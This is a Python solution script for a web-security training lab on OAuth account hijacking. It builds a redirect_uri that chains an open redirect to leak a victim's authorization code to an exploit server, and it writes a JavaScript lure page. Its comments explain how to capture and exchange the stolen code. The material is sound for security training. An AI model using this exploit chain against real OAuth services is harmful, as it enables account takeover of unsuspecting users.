"""
Lab 3: OAuth account hijacking via redirect_uri
https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
Difficulty: Practitioner

📝 The flaw: the OAuth provider only checks that redirect_uri STARTS WITH the
registered client host — it doesn't validate the path. The client app happens
to have an open redirect at /post/next?path=. Chain them: point redirect_uri
at the open redirect, which bounces the victim's auth `code` to our server.
"""

from urllib.parse import quote

from utils import get_session, log, note

CLIENT_APP = "https://YOUR-LAB-ID.web-security-academy.net"  # the blog
PROVIDER = "https://oauth-YOUR-LAB-ID.oauth-server.net"       # the social-login host
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
CLIENT_ID = "REPLACE_WITH_CLIENT_ID"  # visible in the initial /auth request


def build_malicious_auth_url():
    note("Chaining the client app's own open redirect (/post/next?path=) as our")
    note("redirect_uri target — the provider only checks the host prefix matches.")

    evil_redirect = f"{CLIENT_APP}/post/next?path={EXPLOIT_SERVER}/exploit"
    auth_url = (
        f"{PROVIDER}/auth"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={quote(evil_redirect, safe='')}"
        f"&response_type=code"
        f"&scope=openid%20profile%20email"
    )
    log(f"Malicious auth URL: {auth_url}")
    return auth_url


def build_lure_page(auth_url):
    """Page to host on the exploit server — redirects victim straight into the flow."""
    return f'<script>window.location = "{auth_url}"</script>'


def run():
    auth_url = build_malicious_auth_url()
    html = build_lure_page(auth_url)

    out_path = "redirect_uri_poc.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote lure page to {out_path}")

    note("Host this at /exploit on the exploit server, and ALSO set up a second")
    note("/exploit page there that just logs incoming requests (so the leaked")
    note("?code=... from the bounced redirect gets captured in the access log).")
    note("Deliver to victim → grab their code from the exploit server's log →")
    note("exchange it yourself to hijack their session.")


if __name__ == "__main__":
    run()
